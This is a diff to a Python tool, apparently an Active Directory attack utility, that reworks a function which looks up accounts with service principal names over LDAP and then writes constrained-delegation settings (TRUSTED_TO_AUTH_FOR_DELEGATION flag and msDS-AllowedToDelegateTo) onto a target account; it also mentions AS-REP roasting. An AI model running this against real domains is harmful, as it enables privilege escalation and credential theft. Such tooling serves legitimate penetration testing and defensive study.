@@ -138,8 +138,11 @@ class dcDumlu():
         elif self.operation == "addConstrained":
             print('[*] Example DN: cn=unsafe inline,cn=Users,' + self.searchBaseName)
             constrainedDn = input('[*] Target DN for adding Constrained Delegation: ')
-            constrainedHostName = input('[*] Computer name for searching services that will be added: ')
-            self.addConstrained(c, constrainedDn, constrainedHostName)
+            constrainedName = input('[*] To determine services to be delegated for a user or computer, search computer or user with a logon name: ')
+            if constrainedDn and constrainedName:
+                self.addConstrained(c, constrainedDn, constrainedName)
+            else:
+                print('[-] The specified values must not empty!')
 
         elif self.operation == "getAsRep":
             self.getAsRep(c)            
@@ -785,18 +788,19 @@ class dcDumlu():
             print('[-] Something went wrong!')
             print('[!] ' + c.result['message'])
 
-    def addConstrained(self, c, constrainedDn, constrainedHostName):
+    def addConstrained(self, c, constrainedDn, constrainedName):
         # userAccountControl 512 NORMAL_ACCOUNT
         # userAccountControl 16777216 TRUSTED_TO_AUTH_FOR_DELEGATION
-        hostSpns = self.searchHost(c, constrainedHostName)
-        if hostSpns is not None:
-            table = PrettyTable(['SPNs of Computer'])
+        c.search(search_base=self.searchBaseName, search_filter='(&(servicePrincipalName=*)(sAMAccountName=*%s*))' % constrainedName, attributes=ALL_ATTRIBUTES)
+        if len(c.entries) > 0:
+            services = c.entries[0]['servicePrincipalName']
+            table = PrettyTable(['Account Name','SPNs of Computer/User'])
             table.align = "l"
-            for service in hostSpns:
-                table.add_row([service])
+            for service in services:
+                table.add_row([c.entries[0]['sAMAccountName'],service])
             print(table)
             print('[*] Trust this user/computer for delegation to specified services only.')
-            allowedToDelegateTo = input('[*] Specify service names that will be added (comma separated): ')
+            allowedToDelegateTo = input('[*] Specify services to which "%s" account can present delegated credentials (comma separated): ' % constrainedDn)
             formattedAllowedToDelegateTo = allowedToDelegateTo.split(',')
             c.modify(constrainedDn, {'userAccountControl': [(MODIFY_REPLACE, [16777728])]})
             c.modify(constrainedDn, {'msDS-AllowedToDelegateTo': [(MODIFY_ADD, formattedAllowedToDelegateTo)]})
@@ -814,7 +818,7 @@ class dcDumlu():
                 print('[!] ' + c.result['message'])
 
         else:
-            print('[-] Computer account was not found!')
+            print('[-] The Computer/User account was not found or the specified user has not a SPN!')
 
     def getAsRep(self, c):
         # Getting all users for the ASREProasting attack.
